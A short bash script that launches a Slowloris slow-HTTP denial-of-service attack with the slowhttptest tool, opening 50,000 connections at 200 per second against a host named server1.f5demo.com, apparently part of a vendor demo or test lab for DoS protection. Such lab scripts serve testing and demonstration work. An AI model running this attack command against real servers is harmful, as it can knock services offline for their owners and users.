#!/bin/bash
echo "Starting Slowloris: slowhttptest -c 50000 -r 200 -u https://server1.f5demo.com"
sleep 3
slowhttptest -c 50000 -r 200 -u https://server1.f5demo.com